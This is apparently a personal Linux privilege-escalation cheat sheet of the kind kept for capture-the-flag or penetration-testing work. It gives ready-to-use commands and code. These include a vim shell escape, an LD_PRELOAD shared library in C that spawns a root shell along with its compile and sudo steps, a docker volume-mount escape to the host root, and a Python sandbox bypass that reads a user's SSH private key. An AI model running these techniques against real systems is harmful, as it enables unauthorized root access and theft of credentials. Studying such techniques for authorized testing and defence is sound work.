### User and permission
-  List cmd that current user can execute as root without password
    ```bash
    sudo -l -S
    ```
- Get shell in VIM: `:!/bin/bash`

### File and directory
- Locate file fast: 
    ```bash
    locale filename
    ````
- Find file cooresponding to a user/group
    ```bash
    find / -group www-data 2>/dev/null
    ````
- Find file that is writable for current user
    ```bash
    find -type f -maxdepth 1 -writable 2>/dev/null
    ````

### Linux Privilege Escalation
- #### Resources:
    - https://book.hacktricks.xyz/linux-hardening/privilege-escalation
- #### LD_PRELOAD
    - Code injection with LD_PRELOAD, LD_PRELOAD is a shared library that will loaded before libc.
        ```c
        #include <stdio.h>
        #include <sys/types.h>
        #include <stdlib.h>
        // Get root shell
        void _init() {
            unsetenv("LD_PRELOAD");
            setgid(0);
            setuid(0);
            system("/bin/bash");
        }
        ```
        ```bash
        gcc -fPIC -shared -o /tmp/pe.so pe.c -nostartfiles # Complie
        sudo LD_PRELOAD=/tmp/pe.so <COMMAND>
        ```
### With Docker
- ###
    ```bash
    docker run -v /:/mnt --rm -it alpine chroot /mnt sh
    ```

### Bypass python sandbox
- ###
    ```python
    input() # execute code __import__('os').system('cat /home/developer/.ssh/id_rsa')
    ```